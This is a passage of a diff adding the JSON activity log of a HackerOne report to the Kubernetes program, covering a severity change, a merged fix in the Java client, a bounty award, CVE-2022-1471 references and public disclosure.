+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "Similar to severity of this one: https://groups.google.com/g/kubernetes-security-announce/c/K_pOK2WbAJk/m/5nL0DcZsAwAJ",
+      "automated_response": false,
+      "created_at": "2023-01-30T18:01:57.890Z",
+      "updated_at": "2023-01-30T18:01:57.890Z",
+      "additional_data": {
+        "old_severity": "Critical (9.0)",
+        "new_severity": "Medium (6.7)",
+        "old_severity_id": 1785243,
+        "new_severity_id": 1838813
+      },
+      "actor": {
+        "username": "cjcullen",
+        "cleared": false,
+        "verified": false,
+        "url": "/cjcullen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 20147767,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks @jlleitschuh for the report. A [fix](https://github.com/kubernetes-client/java/pull/2533) has been merged and cherry-picked, so it will be released in the February patch releases, after which we will send an announcement.\n\nYou were the first to report it to us, so how would you like to be credited in the announcement?",
+      "automated_response": false,
+      "created_at": "2023-01-30T18:05:44.487Z",
+      "updated_at": "2023-01-30T18:05:44.487Z",
+      "actor": {
+        "username": "cjcullen",
+        "cleared": false,
+        "verified": false,
+        "url": "/cjcullen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 20147836,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-01-30T18:09:52.865Z",
+      "updated_at": "2023-01-30T18:09:52.865Z",
+      "actor": {
+        "url": "/kubernetes",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Kubernetes"
+        }
+      },
+      "bounty_amount": "1000.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "kubernetes",
+      "collaborator": {
+        "username": "jlleitschuh",
+        "url": "/jlleitschuh"
+      }
+    },
+    {
+      "id": 20159458,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-01-31T06:17:21.639Z",
+      "updated_at": "2023-01-31T06:17:21.639Z",
+      "actor": {
+        "username": "h1_analyst_oscar",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_oscar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/pu7ypg4n4ur5d2tcr6j69m3jjjb2/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 20615976,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> You were the first to report it to us, so how would you like to be credited in the announcement?\n\nYes please!",
+      "automated_response": false,
+      "created_at": "2023-03-01T14:24:21.584Z",
+      "updated_at": "2023-03-01T14:24:21.584Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21542618,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Public announcement link: https://groups.google.com/g/kubernetes-security-announce/c/mwrakFaEdnc",
+      "automated_response": false,
+      "created_at": "2023-04-25T13:32:05.431Z",
+      "updated_at": "2023-04-25T13:32:05.431Z",
+      "actor": {
+        "username": "saranbalaji90",
+        "cleared": false,
+        "verified": false,
+        "url": "/saranbalaji90",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21542623,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-25T13:32:19.305Z",
+      "updated_at": "2023-04-25T13:32:19.305Z",
+      "actor": {
+        "username": "saranbalaji90",
+        "cleared": false,
+        "verified": false,
+        "url": "/saranbalaji90",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "jlleitschuh",
+        "url": "/jlleitschuh"
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21542625,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-25T13:32:30.230Z",
+      "updated_at": "2023-04-25T13:32:30.230Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "saranbalaji90",
+        "cleared": false,
+        "verified": false,
+        "url": "/saranbalaji90",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21545171,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I've reached out to Google as the CNA for CVE-2022-1471 to request that they add a link to that public announcement link as a reference.",
+      "automated_response": false,
+      "created_at": "2023-04-25T16:44:04.735Z",
+      "updated_at": "2023-04-25T16:44:04.735Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21545175,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-25T16:44:21.144Z",
+      "updated_at": "2023-04-25T16:44:21.144Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21545176,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-04-25T16:44:21.304Z",
+      "updated_at": "2023-04-25T16:44:21.304Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
